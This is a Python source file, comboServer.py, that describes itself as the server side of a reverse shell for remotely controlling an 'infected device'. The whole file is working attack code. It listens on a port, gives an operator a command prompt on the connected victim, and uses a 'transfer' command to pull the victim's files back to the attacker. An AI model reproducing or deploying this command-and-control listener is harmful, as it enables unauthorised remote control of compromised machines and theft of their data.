#------------------------------------------------------------------------------------------------#
#                                comboServer.py                                                  #
# A basic reverse shell program made to remotely control an infected device.                     #
# Listens for connection and shows command line interface when a device connects.                #
# Contains exfiltration capabilities using the command "transfer".                               #
# Help from https://www.thepythoncode.com/article/send-receive-files-using-sockets-python        #
#                                                                                                #
#------------------------------------------------------------------------------------------------#

import os
import select
import socket

#Listens for all IPv4 addresses on local machine
SERVER_HOST = "0.0.0.0"
#5003 for TCP, can be any port over 1024, 80 for HTTP or 443 for HTTPS
SERVER_PORT = 5003
#Max message size is set to 128 KB
BUFFER_SIZE = 1024 * 128
#Separator string for 2 messages at once
SEPARATOR = "<sep>"
#Socket object creation
s = socket.socket()

#Bind socket to IP and port
s.bind((SERVER_HOST,SERVER_PORT))
#Listen for connections, parameter allows for 5 unaccepted connectione before refusing new ones
s.listen(5)
print(f"Listening as {SERVER_HOST}:{SERVER_PORT}...")

#Accept attempted connections
client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")

#Receive cwd from client, decode into string object
cwd = client_socket.recv(BUFFER_SIZE).decode()
print("[+] Current working directory: ",cwd)

def FileTransfer():
    #Receive file info using client socket
    received = client_socket.recv(BUFFER_SIZE).decode()
    print(received.split(SEPARATOR))
    filename, filesize, cwd = received.split(SEPARATOR)

    #Remove absolute path if it exists
    filename = os.path.basename(filename)
    #Convert to int
    filesize = int(filesize)

    #Receive file from socket and write to file stream
    #progress = tqdm.tqdm(range(filesize),f"Receiving {filename}",unit="B",unit_scale=True,unit_divisor=1024); REQUIRES TQDM
    with open(filename,"wb") as f:
        while True:
            #Read 1024 bytes from socket
            #print("About to read bytes")
            bytesRead = client_socket.recv(1024)
            if(bytesRead == 0):
                #Nothing was received
                print("No data written")
                break
            #Write bytes we just received to the file
            f.write(bytesRead)
            #Update progress bar; REQUIRES TQDM
            #progress.update(len(bytesRead))
            #print("Progress updated")

#https://stackoverflow.com/questions/1097974/how-to-empty-a-socket-in-python
#Remove incoming data from socket
def emptySocket(theSocket):
    input = [theSocket]
    while 1:
        inputready, o, e = select.select(input,[],[], 0.0)
        if len(inputready)==0: break
        for s in inputready: s.recv(1)

#Main loop
while True:
    #Receive command
    command = input(f"{cwd} $> ")
    #Check if command is empty
    if not command.strip():
        continue
    args = command.split()
    #Send the encoded command to the client
    client_socket.send(command.encode())
    #Check for exit case
    if command.lower() == "exit":
        break
    if args[0].lower() == "transfer":
        FileTransfer()
    else:
        #Get command results
        output = client_socket.recv(BUFFER_SIZE).decode()
        #Split output from cwd
        if(len(output.split(SEPARATOR)) == 2):
            results, cwd = output.split(SEPARATOR)
        #Erroneous output
        else:
            results = output
        emptySocket(client_socket)
        #Print output
        print(results)